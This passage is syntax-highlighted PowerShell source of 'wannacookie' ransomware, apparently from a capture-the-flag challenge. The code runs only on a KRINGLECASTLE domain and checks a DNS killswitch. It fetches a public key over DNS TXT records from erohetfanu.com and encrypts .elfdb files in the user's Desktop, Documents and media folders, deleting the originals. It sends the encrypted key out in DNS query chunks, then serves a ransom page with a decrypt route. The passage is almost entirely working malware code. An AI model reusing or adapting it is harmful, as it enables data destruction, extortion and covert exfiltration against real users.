        <span class="no">[Int]</span><span class="nv">$BlockSzBts</span> <span class="p">=</span> <span class="nv">$AESP</span><span class="p">.</span><span class="n">BlockSize</span> <span class="p">/</span> <span class="n">8</span><span class="p">;</span>
        <span class="no">[Byte[]]</span><span class="nv">$Data</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nv">$BlockSzBts</span><span class="p">;</span>
        <span class="k">Do</span> <span class="p">{</span>
            <span class="nv">$Count</span> <span class="p">=</span> <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$Data</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$BlockSzBts</span><span class="p">);</span>
            <span class="nv">$CryptoS</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$Data</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$Count</span><span class="p">)</span>
        <span class="p">}</span> <span class="k">While</span> <span class="p">(</span><span class="nv">$Count</span> <span class="o">-gt</span> <span class="n">0</span><span class="p">);</span>
        <span class="nv">$CryptoS</span><span class="p">.</span><span class="n">FlushFinalBlock</span><span class="p">();</span>
        <span class="nv">$CryptoS</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
        <span class="nv">$FileSR</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
        <span class="nv">$FileSW</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
        <span class="nb">Clear-variable</span> <span class="n">-Name</span> <span class="s2">&quot;key&quot;</span><span class="p">;</span>
        <span class="nb">Remove-Item</span> <span class="nv">$File</span>
    <span class="p">}</span>
<span class="p">};</span>
<span class="k">function</span> <span class="n">H2B</span> <span class="p">{</span>
    <span class="k">param</span><span class="p">(</span><span class="nv">$HX</span><span class="p">);</span>
    <span class="nv">$HX</span> <span class="p">=</span> <span class="nv">$HX</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span>
        <span class="nv">$_</span>
    <span class="p">};</span>
    <span class="k">ForEach</span> <span class="p">(</span><span class="nv">$value</span> <span class="k">in</span> <span class="nv">$HX</span><span class="p">){</span>
        <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="n">16</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">};</span>
<span class="k">function</span> <span class="n">A2H</span><span class="p">(){</span>
    <span class="k">Param</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
    <span class="nv">$c</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="nv">$b</span> <span class="p">=</span> <span class="nv">$a</span><span class="p">.</span><span class="n">ToCharArray</span><span class="p">();</span>
    <span class="p">;</span>
    <span class="k">Foreach</span> <span class="p">(</span><span class="nv">$element</span> <span class="k">in</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$c</span> <span class="p">=</span> <span class="nv">$c</span> <span class="p">+</span> <span class="s2">&quot; &quot;</span> <span class="p">+</span> <span class="no">[System.String]</span><span class="p">::</span><span class="n">Format</span><span class="p">(</span><span class="s2">&quot;{0:X}&quot;</span><span class="p">,</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">ToUInt32</span><span class="p">(</span><span class="nv">$element</span><span class="p">))</span>
    <span class="p">};</span>
    <span class="k">return</span> <span class="nv">$c</span> <span class="o">-replace</span> <span class="s1">&#39; &#39;</span>
<span class="p">};</span>
<span class="k">function</span> <span class="n">H2A</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">Param</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
    <span class="nv">$outa</span><span class="p">;</span>
    <span class="nv">$a</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span>
        <span class="nv">$_</span>
    <span class="p">}</span>  <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span>
        <span class="no">[char]</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">toint16</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span><span class="n">16</span><span class="p">))</span>
    <span class="p">}</span> <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span>
        <span class="nv">$outa</span> <span class="p">=</span> <span class="nv">$outa</span> <span class="p">+</span> <span class="nv">$_</span>
    <span class="p">};</span>
    <span class="k">return</span> <span class="nv">$outa</span>
<span class="p">};</span>
<span class="k">function</span> <span class="n">B2H</span> <span class="p">{</span>
    <span class="k">param</span><span class="p">(</span><span class="nv">$DEC</span><span class="p">);</span>
    <span class="nv">$tmp</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="k">ForEach</span> <span class="p">(</span><span class="nv">$value</span> <span class="k">in</span> <span class="nv">$DEC</span><span class="p">){</span>
        <span class="nv">$a</span> <span class="p">=</span> <span class="s2">&quot;{0:x}&quot;</span> <span class="o">-f</span> <span class="no">[Int]</span><span class="nv">$value</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">.</span><span class="n">length</span> <span class="o">-eq</span> <span class="n">1</span><span class="p">){</span>
            <span class="nv">$tmp</span> <span class="p">+=</span> <span class="s1">&#39;0&#39;</span> <span class="p">+</span> <span class="nv">$a</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$tmp</span> <span class="p">+=</span> <span class="nv">$a</span>
        <span class="p">}</span>
    <span class="p">};</span>
    <span class="k">return</span> <span class="nv">$tmp</span>
<span class="p">};</span>
<span class="k">function</span> <span class="n">ti_rox</span> <span class="p">{</span>
    <span class="k">param</span><span class="p">(</span><span class="nv">$b1</span><span class="p">,</span> <span class="nv">$b2</span><span class="p">);</span>
    <span class="nv">$b1</span> <span class="p">=</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$b1</span><span class="p">);</span>
    <span class="nv">$b2</span> <span class="p">=</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$b2</span><span class="p">);</span>
    <span class="nv">$cont</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="nv">$b1</span><span class="p">.</span><span class="n">count</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$b1</span><span class="p">.</span><span class="n">count</span> <span class="o">-eq</span> <span class="nv">$b2</span><span class="p">.</span><span class="n">count</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="p">=</span><span class="n">0</span><span class="p">;</span>
                <span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$b1</span><span class="p">.</span><span class="n">count</span> <span class="p">;</span>
                <span class="nv">$i</span><span class="p">++)</span> <span class="p">{</span>
            <span class="nv">$cont</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="p">=</span> <span class="nv">$b1</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">-bxor</span> <span class="nv">$b2</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span>
        <span class="p">}</span>
    <span class="p">};</span>
    <span class="k">return</span> <span class="nv">$cont</span>
<span class="p">};</span>
<span class="k">function</span> <span class="n">B2G</span> <span class="p">{</span>
    <span class="k">param</span><span class="p">(</span><span class="no">[byte[]]</span><span class="nv">$Data</span><span class="p">);</span>
    <span class="k">Process</span> <span class="p">{</span>
        <span class="nv">$out</span> <span class="p">=</span> <span class="no">[System.IO.MemoryStream]</span><span class="p">::</span><span class="n">new</span><span class="p">();</span>
        <span class="nv">$gStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$out</span><span class="p">,</span> <span class="p">(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Compress</span><span class="p">);</span>
        <span class="nv">$gStream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$Data</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$Data</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
        <span class="nv">$gStream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
        <span class="k">return</span> <span class="nv">$out</span><span class="p">.</span><span class="n">ToArray</span><span class="p">()</span>
    <span class="p">}</span>
<span class="p">};</span>
<span class="k">function</span> <span class="n">G2B</span> <span class="p">{</span>
    <span class="k">param</span><span class="p">(</span><span class="no">[byte[]]</span><span class="nv">$Data</span><span class="p">);</span>
    <span class="k">Process</span> <span class="p">{</span>
        <span class="nv">$SrcData</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(</span> <span class="p">,</span> <span class="nv">$Data</span> <span class="p">);</span>
        <span class="nv">$output</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">;</span>
        <span class="nv">$gStream</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">GzipStream</span> <span class="nv">$SrcData</span><span class="p">,</span> <span class="p">(</span><span class="no">[IO.Compression.CompressionMode]</span><span class="p">::</span><span class="n">Decompress</span><span class="p">);</span>
        <span class="nv">$gStream</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span> <span class="nv">$output</span> <span class="p">);</span>
        <span class="nv">$gStream</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
        <span class="nv">$SrcData</span><span class="p">.</span><span class="n">Close</span><span class="p">();</span>
        <span class="no">[byte[]]</span> <span class="nv">$byteArr</span> <span class="p">=</span> <span class="nv">$output</span><span class="p">.</span><span class="n">ToArray</span><span class="p">();</span>
        <span class="k">return</span> <span class="nv">$byteArr</span>
    <span class="p">}</span>
<span class="p">};</span>
<span class="k">function</span> <span class="n">sh1</span><span class="p">(</span><span class="no">[String]</span> <span class="nv">$String</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$SB</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">StringBuilder</span><span class="p">;</span>
    <span class="no">[System.Security.Cryptography.HashAlgorithm]</span><span class="p">::</span><span class="n">Create</span><span class="p">(</span><span class="s2">&quot;SHA1&quot;</span><span class="p">).</span><span class="n">ComputeHash</span><span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$String</span><span class="p">))|%{</span>
        <span class="no">[Void]</span><span class="nv">$SB</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">))</span>
    <span class="p">};</span>
    <span class="nv">$SB</span><span class="p">.</span><span class="n">ToString</span><span class="p">()</span>
<span class="p">};</span>
<span class="k">function</span> <span class="n">p_k_e</span><span class="p">(</span><span class="nv">$key_bytes</span><span class="p">,</span> <span class="no">[byte[]]</span><span class="nv">$pub_bytes</span><span class="p">){</span>
    <span class="nv">$cert</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Cryptography</span><span class="p">.</span><span class="n">X509Certificates</span><span class="p">.</span><span class="n">X509Certificate2</span><span class="p">;</span>
    <span class="nv">$cert</span><span class="p">.</span><span class="n">Import</span><span class="p">(</span><span class="nv">$pub_bytes</span><span class="p">);</span>
    <span class="nv">$encKey</span> <span class="p">=</span> <span class="nv">$cert</span><span class="p">.</span><span class="n">PublicKey</span><span class="p">.</span><span class="n">Key</span><span class="p">.</span><span class="n">Encrypt</span><span class="p">(</span><span class="nv">$key_bytes</span><span class="p">,</span> <span class="nv">$true</span><span class="p">);</span>
    <span class="k">return</span> <span class="p">$(</span><span class="n">B2H</span> <span class="nv">$encKey</span><span class="p">)</span>
<span class="p">};</span>
<span class="k">function</span> <span class="n">e_n_d</span> <span class="p">{</span>
    <span class="k">param</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$allfiles</span><span class="p">,</span> <span class="nv">$make_cookie</span> <span class="p">);</span>
    <span class="nv">$tcount</span> <span class="p">=</span> <span class="n">12</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span> <span class="nv">$file</span><span class="p">=</span><span class="n">0</span><span class="p">;</span>
            <span class="nv">$file</span> <span class="o">-lt</span> <span class="nv">$allfiles</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>
            <span class="nv">$file</span><span class="p">++</span>  <span class="p">)</span> <span class="p">{</span>
        <span class="k">while</span> <span class="p">(</span><span class="nv">$true</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$running</span> <span class="p">=</span> <span class="p">@(</span><span class="nb">Get-Job</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span>
                    <span class="nv">$_</span><span class="p">.</span><span class="n">State</span> <span class="o">-eq</span> <span class="s1">&#39;Running&#39;</span>
                    <span class="p">});</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$running</span><span class="p">.</span><span class="n">Count</span> <span class="o">-le</span> <span class="nv">$tcount</span><span class="p">)</span> <span class="p">{</span>
                <span class="nb">Start-Job</span>  <span class="n">-ScriptBlock</span> <span class="p">{</span>
                    <span class="k">param</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$File</span><span class="p">,</span> <span class="nv">$true_false</span><span class="p">);</span>
                    <span class="k">try</span><span class="p">{</span>
                        <span class="n">e_d_file</span> <span class="nv">$key</span> <span class="nv">$File</span> <span class="nv">$true_false</span>
                    <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
                        <span class="nv">$_</span><span class="p">.</span><span class="n">Exception</span><span class="p">.</span><span class="n">Message</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="p">$(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Desktop\ps_log.txt&#39;</span><span class="p">)</span> <span class="n">-append</span>
                    <span class="p">}</span>
                <span class="p">}</span> <span class="n">-args</span> <span class="nv">$key</span><span class="p">,</span> <span class="nv">$allfiles</span><span class="p">[</span><span class="nv">$file</span><span class="p">],</span> <span class="nv">$make_cookie</span> <span class="n">-InitializationScript</span> <span class="nv">$functions</span><span class="p">;</span>
                <span class="k">break</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nb">Start-Sleep</span> <span class="n">-m</span> <span class="n">200</span><span class="p">;</span>
                <span class="k">continue</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">};</span>
<span class="k">function</span> <span class="n">g_o_dns</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$h</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$i</span> <span class="k">in</span> <span class="n">0</span><span class="p">..(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">($(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">,</span> <span class="n">10</span><span class="p">)-</span><span class="n">1</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$h</span> <span class="p">+=</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$i.$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span>
    <span class="p">};</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">H2A</span> <span class="nv">$h</span><span class="p">)</span>
<span class="p">};</span>
<span class="k">function</span> <span class="n">s_2_c</span><span class="p">(</span><span class="nv">$astring</span><span class="p">,</span> <span class="nv">$size</span><span class="p">=</span><span class="n">32</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$new_arr</span> <span class="p">=</span> <span class="p">@();</span>
    <span class="nv">$chunk_index</span><span class="p">=</span><span class="n">0</span><span class="p">;</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$i</span> <span class="k">in</span> <span class="n">1</span><span class="p">..$(</span><span class="nv">$astring</span><span class="p">.</span><span class="n">length</span> <span class="p">/</span> <span class="nv">$size</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$new_arr</span> <span class="p">+=</span> <span class="p">@(</span><span class="nv">$astring</span><span class="p">.</span><span class="n">substring</span><span class="p">(</span><span class="nv">$chunk_index</span><span class="p">,</span><span class="nv">$size</span><span class="p">));</span>
        <span class="nv">$chunk_index</span> <span class="p">+=</span> <span class="nv">$size</span>
    <span class="p">};</span>
    <span class="k">return</span> <span class="nv">$new_arr</span>
<span class="p">};</span>
<span class="k">function</span> <span class="n">snd_k</span><span class="p">(</span><span class="nv">$enc_k</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$chunks</span> <span class="p">=</span> <span class="p">(</span><span class="n">s_2_c</span> <span class="nv">$enc_k</span> <span class="p">);</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$j</span> <span class="k">in</span> <span class="nv">$chunks</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$chunks</span><span class="p">.</span><span class="n">IndexOf</span><span class="p">(</span><span class="nv">$j</span><span class="p">)</span> <span class="o">-eq</span> <span class="n">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$n_c_id</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$j.6B6579666F72626F746964.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$n_c_id.$j.6B6579666F72626F746964.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span>
        <span class="p">}</span>
    <span class="p">};</span>
    <span class="k">return</span> <span class="nv">$n_c_id</span>
<span class="p">};</span>
<span class="k">function</span> <span class="n">wanc</span> <span class="p">{</span>
    <span class="nv">$S1</span> <span class="p">=</span> <span class="s2">&quot;1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000&quot;</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$null</span> <span class="o">-ne</span> <span class="p">((</span><span class="nb">Resolve-DnsName</span> <span class="n">-Name</span> <span class="p">$(</span><span class="n">H2A</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">ti_rox</span> <span class="p">$(</span><span class="n">B2H</span> <span class="p">$(</span><span class="n">G2B</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$S1</span><span class="p">)))</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="n">6B696C6C737769746368</span><span class="p">.</span><span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">))).</span><span class="n">ToString</span><span class="p">()</span> <span class="n">-ErrorAction</span> <span class="n">0</span> <span class="n">-Server</span> <span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">.</span><span class="n">8</span><span class="p">)))</span> <span class="p">{</span>
        <span class="k">return</span>
    <span class="p">};</span>
    <span class="k">if</span> <span class="p">($(</span><span class="n">netstat</span> <span class="n">-ano</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s2">&quot;127.0.0.1:8080&quot;</span><span class="p">).</span><span class="n">length</span> <span class="o">-ne</span> <span class="n">0</span> <span class="o">-or</span> <span class="p">(</span><span class="nb">Get-WmiObject</span> <span class="n">Win32_ComputerSystem</span><span class="p">).</span><span class="n">Domain</span> <span class="o">-ne</span> <span class="s2">&quot;KRINGLECASTLE&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span>
    <span class="p">};</span>
    <span class="nv">$p_k</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">($(</span><span class="n">g_o_dns</span><span class="p">(</span><span class="s2">&quot;7365727665722E637274&quot;</span><span class="p">)</span> <span class="p">)</span> <span class="p">);</span>
    <span class="nv">$b_k</span> <span class="p">=</span> <span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">($((</span><span class="no">[char[]]</span><span class="p">(</span><span class="no">[char]01..[char]</span><span class="n">255</span><span class="p">)</span> <span class="p">+</span> <span class="p">(</span><span class="no">[char[]]</span><span class="p">(</span><span class="no">[char]01..[char]</span><span class="n">255</span><span class="p">))</span> <span class="p">+</span> <span class="n">0</span><span class="p">..</span><span class="n">9</span> <span class="p">|</span> <span class="n">sort</span> <span class="p">{</span>
                        <span class="nb">Get-Random</span>
                        <span class="p">})[</span><span class="n">0</span><span class="p">..</span><span class="n">15</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>  <span class="p">|</span> <span class="p">?</span> <span class="p">{</span>
            <span class="nv">$_</span> <span class="o">-ne</span> <span class="n">0x00</span>
            <span class="p">});</span>
    <span class="nv">$h_k</span> <span class="p">=</span> <span class="p">$(</span><span class="n">B2H</span> <span class="nv">$b_k</span><span class="p">);</span>
    <span class="nv">$k_h</span> <span class="p">=</span> <span class="p">$(</span><span class="n">sh1</span> <span class="nv">$h_k</span><span class="p">);</span>
    <span class="nv">$p_k_e_k</span> <span class="p">=</span> <span class="p">(</span><span class="n">p_k_e</span> <span class="nv">$b_k</span> <span class="nv">$p_k</span><span class="p">).</span><span class="n">ToString</span><span class="p">();</span>
    <span class="nv">$c_id</span> <span class="p">=</span> <span class="p">(</span><span class="n">snd_k</span> <span class="nv">$p_k_e_k</span><span class="p">);</span>
    <span class="nv">$d_t</span> <span class="p">=</span> <span class="p">(($(</span><span class="nb">Get-Date</span><span class="p">).</span><span class="n">ToUniversalTime</span><span class="p">()</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">)</span> <span class="o">-replace</span> <span class="s2">&quot;</span><span class="se">`r`n</span><span class="s2">&quot;</span><span class="p">);</span>
    <span class="no">[array]</span><span class="nv">$f_c</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Get-ChildItem</span> <span class="p">*.</span><span class="n">elfdb</span> <span class="n">-Exclude</span> <span class="p">*.</span><span class="n">wannacookie</span> <span class="n">-Path</span> <span class="p">$($(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Desktop&#39;</span><span class="p">),$(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Documents&#39;</span><span class="p">),$(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Videos&#39;</span><span class="p">),$(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Pictures&#39;</span><span class="p">),$(</span><span class="nv">$env:userprofile</span><span class="p">+</span><span class="s1">&#39;\Music&#39;</span><span class="p">))</span> <span class="n">-Recurse</span> <span class="p">|</span> <span class="n">where</span> <span class="p">{</span>
            <span class="p">!</span> <span class="nv">$_</span><span class="p">.</span><span class="n">PSIsContainer</span>
            <span class="p">}</span> <span class="p">|</span> <span class="k">Foreach</span><span class="n">-Object</span> <span class="p">{</span>
            <span class="nv">$_</span><span class="p">.</span><span class="n">Fullname</span>
            <span class="p">});</span>
    <span class="n">e_n_d</span> <span class="nv">$b_k</span> <span class="nv">$f_c</span> <span class="nv">$true</span><span class="p">;</span>
    <span class="nb">Clear-variable</span> <span class="n">-Name</span> <span class="s2">&quot;h_k&quot;</span><span class="p">;</span>
    <span class="nb">Clear-variable</span> <span class="n">-Name</span> <span class="s2">&quot;b_k&quot;</span><span class="p">;</span>
    <span class="nv">$lurl</span> <span class="p">=</span> <span class="s1">&#39;http://127.0.0.1:8080/&#39;</span><span class="p">;</span>
    <span class="nv">$html_c</span> <span class="p">=</span> <span class="p">@{</span>
        <span class="s1">&#39;GET /&#39;</span>  <span class="p">=</span>  <span class="p">$(</span><span class="n">g_o_dns</span> <span class="p">(</span><span class="n">A2H</span> <span class="s2">&quot;source.min.html&quot;</span><span class="p">));</span>
        <span class="s1">&#39;GET /close&#39;</span>  <span class="p">=</span>  <span class="s1">&#39;&lt;p&gt;Bye!&lt;/p&gt;&#39;</span>
    <span class="p">};</span>
    <span class="nb">Start-Job</span> <span class="n">-ScriptBlock</span><span class="p">{</span>
        <span class="k">param</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
        <span class="nb">Start-Sleep</span> <span class="n">10</span><span class="p">;</span>
        <span class="nb">Add-type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">Windows</span><span class="p">.</span><span class="n">Forms</span><span class="p">;</span>
        <span class="nb">start-process</span> <span class="s2">&quot;$url&quot;</span> <span class="n">-WindowStyle</span> <span class="n">Maximized</span><span class="p">;</span>
        <span class="nb">Start-sleep</span> <span class="n">2</span><span class="p">;</span>
        <span class="no">[System.Windows.Forms.SendKeys]</span><span class="p">::</span><span class="n">SendWait</span><span class="p">(</span><span class="s2">&quot;{F11}&quot;</span><span class="p">)</span>
    <span class="p">}</span> <span class="n">-Arg</span> <span class="nv">$lurl</span><span class="p">;</span>
    <span class="nv">$list</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">HttpListener</span><span class="p">;</span>
    <span class="nv">$list</span><span class="p">.</span><span class="n">Prefixes</span><span class="p">.</span><span class="n">Add</span><span class="p">(</span><span class="nv">$lurl</span><span class="p">);</span>
    <span class="nv">$list</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="nv">$close</span> <span class="p">=</span> <span class="nv">$false</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="nv">$list</span><span class="p">.</span><span class="n">IsListening</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$context</span> <span class="p">=</span> <span class="nv">$list</span><span class="p">.</span><span class="n">GetContext</span><span class="p">();</span>
            <span class="nv">$Req</span> <span class="p">=</span> <span class="nv">$context</span><span class="p">.</span><span class="n">Request</span><span class="p">;</span>
            <span class="nv">$Resp</span> <span class="p">=</span> <span class="nv">$context</span><span class="p">.</span><span class="n">Response</span><span class="p">;</span>
            <span class="nv">$recvd</span> <span class="p">=</span> <span class="s1">&#39;{0} {1}&#39;</span> <span class="o">-f</span> <span class="nv">$Req</span><span class="p">.</span><span class="n">httpmethod</span><span class="p">,</span> <span class="nv">$Req</span><span class="p">.</span><span class="n">url</span><span class="p">.</span><span class="n">localpath</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$recvd</span> <span class="o">-eq</span> <span class="s1">&#39;GET /&#39;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$html</span> <span class="p">=</span> <span class="nv">$html_c</span><span class="p">[</span><span class="nv">$recvd</span><span class="p">]</span>
            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$recvd</span> <span class="o">-eq</span> <span class="s1">&#39;GET /decrypt&#39;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$akey</span> <span class="p">=</span> <span class="nv">$Req</span><span class="p">.</span><span class="n">QueryString</span><span class="p">.</span><span class="n">Item</span><span class="p">(</span><span class="s2">&quot;key&quot;</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="nv">$k_h</span> <span class="o">-eq</span> <span class="p">$(</span><span class="n">sh1</span> <span class="nv">$akey</span><span class="p">))</span> <span class="p">{</span>
                    <span class="nv">$akey</span> <span class="p">=</span> <span class="p">$(</span><span class="n">H2B</span> <span class="nv">$akey</span><span class="p">);</span>
                    <span class="no">[array]</span><span class="nv">$f_c</span> <span class="p">=</span> <span class="p">$(</span><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="p">$(</span><span class="nv">$env:userprofile</span><span class="p">)</span> <span class="n">-Recurse</span>  <span class="n">-Filter</span> <span class="p">*.</span><span class="n">wannacookie</span> <span class="p">|</span> <span class="n">where</span> <span class="p">{</span>
                            <span class="p">!</span> <span class="nv">$_</span><span class="p">.</span><span class="n">PSIsContainer</span>
